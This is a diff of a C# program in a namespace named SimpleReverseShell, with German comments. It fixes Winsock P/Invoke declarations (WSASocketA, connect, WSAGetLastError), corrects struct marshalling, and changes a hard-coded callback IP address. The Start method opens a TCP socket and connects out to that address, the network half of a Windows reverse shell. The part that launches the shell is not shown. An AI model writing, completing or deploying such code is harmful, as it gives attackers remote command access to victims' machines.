@@ -87,7 +87,7 @@ namespace SimpleReverseShell
     /// <param name="dwFlags">Kann NULL sein.</param>
     /// <returns></returns>
     [DllImport("Ws2_32.dll")]
-    public static extern SOCKET WSASocketA(int af, int type, int protocol, WSAPROTOCOL_INFOA protocolInfo, int group, int dwFlags);
+    public static extern IntPtr WSASocketA(int af, int type, int protocol, WSAPROTOCOL_INFOA protocolInfo, int group, int dwFlags);
 
     /// <summary>
     /// Importierte Methode um ein Socket zu connecten.
@@ -97,8 +97,11 @@ namespace SimpleReverseShell
     /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
     /// <param name="namelen">Länge der Sockaddr Struktur</param>
     /// <returns></returns>
+    [DllImport("Ws2_32.dll", SetLastError = true)]
+    public static extern int connect(IntPtr socket, ref SockAddr name, int namelen);
+
     [DllImport("Ws2_32.dll")]
-    public static extern int connect(SOCKET socket, ref SockAddr name, int namelen);
+    public static extern int WSAGetLastError();
 
     /// <summary>
     /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa
@@ -125,7 +128,8 @@ namespace SimpleReverseShell
       int iSecurityScheme;
       int dwMessageSize;
       int dwProviderReserved;
-      char szProtocol;
+      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
+      char[] szProtocol;
     }
 
     /// <summary>
@@ -189,13 +193,12 @@ namespace SimpleReverseShell
     public void Start()
     {
       var protcolInfo = new WSAPROTOCOL_INFOA();
-      var ipv4 = new SockAddr();
 
       var addrIn = new In_Addr();
-      addrIn.s_b1 = 192;
+      addrIn.s_b1 = 128;
       addrIn.s_b2 = 168;
-      addrIn.s_b3 = 0;
-      addrIn.s_b4 = 187;
+      addrIn.s_b3 = 126;
+      addrIn.s_b4 = 128;
 
       var sockAddrIn = new SockAddr_In();
       sockAddrIn.s_family = 2;
@@ -225,8 +228,12 @@ namespace SimpleReverseShell
 
 
       var socket = WSASocketA(2, 1, 6, protcolInfo, 0, 0);
-      connect(socket, ref sockaddr, Marshal.SizeOf(sockaddr));
-      // connect call.
+      var connectSuccess = connect(socket, ref sockaddr, Marshal.SizeOf(sockaddr));
+      
+      if (connectSuccess != 0)
+      {
+        var errorCode = WSAGetLastError();
+      }
     }
   }
 }
